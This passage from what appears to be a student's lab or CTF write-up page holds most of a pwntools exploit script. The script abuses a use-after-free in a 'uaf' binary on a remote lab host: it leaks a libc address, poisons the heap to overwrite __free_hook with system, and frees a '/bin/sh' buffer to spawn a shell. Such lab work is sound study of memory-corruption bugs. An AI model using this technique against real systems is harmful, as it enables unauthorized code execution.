<a id="__codelineno-6-61" name="__codelineno-6-61"></a><a href="#__codelineno-6-61"><span class="linenos" data-linenos=" 61 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_intro</span><span class="p">)</span>
<a id="__codelineno-6-62" name="__codelineno-6-62"></a><a href="#__codelineno-6-62"><span class="linenos" data-linenos=" 62 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-63" name="__codelineno-6-63"></a><a href="#__codelineno-6-63"><span class="linenos" data-linenos=" 63 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_motto</span><span class="p">)</span>
<a id="__codelineno-6-64" name="__codelineno-6-64"></a><a href="#__codelineno-6-64"><span class="linenos" data-linenos=" 64 "></span></a>    <span class="k">return</span>
<a id="__codelineno-6-65" name="__codelineno-6-65"></a><a href="#__codelineno-6-65"><span class="linenos" data-linenos=" 65 "></span></a>
<a id="__codelineno-6-66" name="__codelineno-6-66"></a><a href="#__codelineno-6-66"><span class="linenos" data-linenos=" 66 "></span></a>
<a id="__codelineno-6-67" name="__codelineno-6-67"></a><a href="#__codelineno-6-67"><span class="linenos" data-linenos=" 67 "></span></a><span class="c1"># p = process(&#39;./uaf&#39;)  </span>
<a id="__codelineno-6-68" name="__codelineno-6-68"></a><a href="#__codelineno-6-68"><span class="linenos" data-linenos=" 68 "></span></a><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.154.20.109&#39;</span><span class="p">,</span><span class="mi">10402</span><span class="p">)</span>
<a id="__codelineno-6-69" name="__codelineno-6-69"></a><a href="#__codelineno-6-69"><span class="linenos" data-linenos=" 69 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;StudentID:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-70" name="__codelineno-6-70"></a><a href="#__codelineno-6-70"><span class="linenos" data-linenos=" 70 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;----------&#39;</span><span class="p">)</span><span class="o">//</span><span class="n">学号</span>
<a id="__codelineno-6-71" name="__codelineno-6-71"></a><a href="#__codelineno-6-71"><span class="linenos" data-linenos=" 71 "></span></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./uaf&quot;</span><span class="p">)</span>
<a id="__codelineno-6-72" name="__codelineno-6-72"></a><a href="#__codelineno-6-72"><span class="linenos" data-linenos=" 72 "></span></a><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.31.so&#39;</span><span class="p">)</span> 
<a id="__codelineno-6-73" name="__codelineno-6-73"></a><a href="#__codelineno-6-73"><span class="linenos" data-linenos=" 73 "></span></a>
<a id="__codelineno-6-74" name="__codelineno-6-74"></a><a href="#__codelineno-6-74"><span class="linenos" data-linenos=" 74 "></span></a><span class="n">bob_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Bob&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;123456</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s2">&quot;hello there, i am bob&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;try everything&quot;</span><span class="p">)</span>
<a id="__codelineno-6-75" name="__codelineno-6-75"></a><a href="#__codelineno-6-75"><span class="linenos" data-linenos=" 75 "></span></a><span class="n">alice_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Alice&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;654321</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;hi everyone, i am alice&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;eat more vegetables&quot;</span><span class="p">)</span>
<a id="__codelineno-6-76" name="__codelineno-6-76"></a><a href="#__codelineno-6-76"><span class="linenos" data-linenos=" 76 "></span></a><span class="n">jimmy_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Jimmy&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;abc321</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s2">&quot;didotidido&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;&lt;blank/&gt;&quot;</span><span class="p">)</span>
<a id="__codelineno-6-77" name="__codelineno-6-77"></a><a href="#__codelineno-6-77"><span class="linenos" data-linenos=" 77 "></span></a><span class="n">jack_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Jack&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;p4ssw0rd</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;blablabla&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;...&quot;</span><span class="p">)</span>
<a id="__codelineno-6-78" name="__codelineno-6-78"></a><a href="#__codelineno-6-78"><span class="linenos" data-linenos=" 78 "></span></a><span class="n">charles_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Charles&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;aaabbb</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s2">&quot;Beautiful is better than ugly&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;&lt;alert&gt;&quot;</span><span class="p">)</span>
<a id="__codelineno-6-79" name="__codelineno-6-79"></a><a href="#__codelineno-6-79"><span class="linenos" data-linenos=" 79 "></span></a><span class="n">mark_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Mark&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;marknb11</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s2">&quot;Explicit is better than implicit&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;watch out&quot;</span><span class="p">)</span>
<a id="__codelineno-6-80" name="__codelineno-6-80"></a><a href="#__codelineno-6-80"><span class="linenos" data-linenos=" 80 "></span></a><span class="n">vincent_idx</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Vincent&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;m950524</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;my name is vincent! vincent&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;________&quot;</span><span class="p">)</span>
<a id="__codelineno-6-81" name="__codelineno-6-81"></a><a href="#__codelineno-6-81"><span class="linenos" data-linenos=" 81 "></span></a><span class="n">A</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-6-82" name="__codelineno-6-82"></a><a href="#__codelineno-6-82"><span class="linenos" data-linenos=" 82 "></span></a><span class="n">B</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">)</span>
<a id="__codelineno-6-83" name="__codelineno-6-83"></a><a href="#__codelineno-6-83"><span class="linenos" data-linenos=" 83 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">vincent_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;m950524</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-84" name="__codelineno-6-84"></a><a href="#__codelineno-6-84"><span class="linenos" data-linenos=" 84 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">mark_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;marknb11</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-85" name="__codelineno-6-85"></a><a href="#__codelineno-6-85"><span class="linenos" data-linenos=" 85 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">charles_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;aaabbb</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-86" name="__codelineno-6-86"></a><a href="#__codelineno-6-86"><span class="linenos" data-linenos=" 86 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">jack_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;p4ssw0rd</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-87" name="__codelineno-6-87"></a><a href="#__codelineno-6-87"><span class="linenos" data-linenos=" 87 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">jimmy_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;abc321</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-88" name="__codelineno-6-88"></a><a href="#__codelineno-6-88"><span class="linenos" data-linenos=" 88 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">alice_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;654321</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-89" name="__codelineno-6-89"></a><a href="#__codelineno-6-89"><span class="linenos" data-linenos=" 89 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">bob_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;123456</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-6-90" name="__codelineno-6-90"></a><a href="#__codelineno-6-90"><span class="linenos" data-linenos=" 90 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-91" name="__codelineno-6-91"></a><a href="#__codelineno-6-91"><span class="linenos" data-linenos=" 91 "></span></a><span class="c1"># context.log_level = &#39;DEBUG&#39;</span>
<a id="__codelineno-6-92" name="__codelineno-6-92"></a><a href="#__codelineno-6-92"><span class="linenos" data-linenos=" 92 "></span></a><span class="p">[</span><span class="n">name</span><span class="p">,</span><span class="n">motto</span><span class="p">,</span><span class="n">intro</span><span class="p">]</span><span class="o">=</span><span class="n">handle_show</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-93" name="__codelineno-6-93"></a><a href="#__codelineno-6-93"><span class="linenos" data-linenos=" 93 "></span></a>
<a id="__codelineno-6-94" name="__codelineno-6-94"></a><a href="#__codelineno-6-94"><span class="linenos" data-linenos=" 94 "></span></a><span class="n">leak_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">intro</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
<a id="__codelineno-6-95" name="__codelineno-6-95"></a><a href="#__codelineno-6-95"><span class="linenos" data-linenos=" 95 "></span></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
<a id="__codelineno-6-96" name="__codelineno-6-96"></a><a href="#__codelineno-6-96"><span class="linenos" data-linenos=" 96 "></span></a>
<a id="__codelineno-6-97" name="__codelineno-6-97"></a><a href="#__codelineno-6-97"><span class="linenos" data-linenos=" 97 "></span></a><span class="n">lbase</span><span class="o">=</span><span class="n">leak_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span><span class="o">-</span><span class="mh">0x70</span>
<a id="__codelineno-6-98" name="__codelineno-6-98"></a><a href="#__codelineno-6-98"><span class="linenos" data-linenos=" 98 "></span></a><span class="n">system_addr</span><span class="o">=</span><span class="n">lbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<a id="__codelineno-6-99" name="__codelineno-6-99"></a><a href="#__codelineno-6-99"><span class="linenos" data-linenos=" 99 "></span></a><span class="n">free_hook_addr</span> <span class="o">=</span> <span class="n">lbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
<a id="__codelineno-6-100" name="__codelineno-6-100"></a><a href="#__codelineno-6-100"><span class="linenos" data-linenos="100 "></span></a><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;system address: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<a id="__codelineno-6-101" name="__codelineno-6-101"></a><a href="#__codelineno-6-101"><span class="linenos" data-linenos="101 "></span></a>
<a id="__codelineno-6-102" name="__codelineno-6-102"></a><a href="#__codelineno-6-102"><span class="linenos" data-linenos="102 "></span></a><span class="n">handle_edit</span><span class="p">(</span><span class="n">bob_idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;123456</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">),</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-6-103" name="__codelineno-6-103"></a><a href="#__codelineno-6-103"><span class="linenos" data-linenos="103 "></span></a>
<a id="__codelineno-6-104" name="__codelineno-6-104"></a><a href="#__codelineno-6-104"><span class="linenos" data-linenos="104 "></span></a><span class="n">A</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-6-105" name="__codelineno-6-105"></a><a href="#__codelineno-6-105"><span class="linenos" data-linenos="105 "></span></a><span class="n">B</span> <span class="o">=</span> <span class="n">handle_add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span><span class="sa">b</span><span class="s1">&#39;BBB</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">)</span>
<a id="__codelineno-6-106" name="__codelineno-6-106"></a><a href="#__codelineno-6-106"><span class="linenos" data-linenos="106 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-6-107" name="__codelineno-6-107"></a><a href="#__codelineno-6-107"><span class="linenos" data-linenos="107 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p><img alt="uaf" src="pic/uaf.jpg" /> </p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  回到页面顶部
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "content.code.annotate", "navigation.indexes", "navigation.top", "toc.follow", "search.suggest", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="../../../window.MathJax = {
  tex: {
    inlineMath: [[&#39;$&#39;, &#39;$&#39;], [&#39;/(&#39;, &#39;/)&#39;]],
    displayMath: [[&#39;$$&#39;, &#39;$$&#39;], [&#39;/[&#39;, &#39;/]&#39;]]
  }
};
"></script>
      
    
  </body>
</html>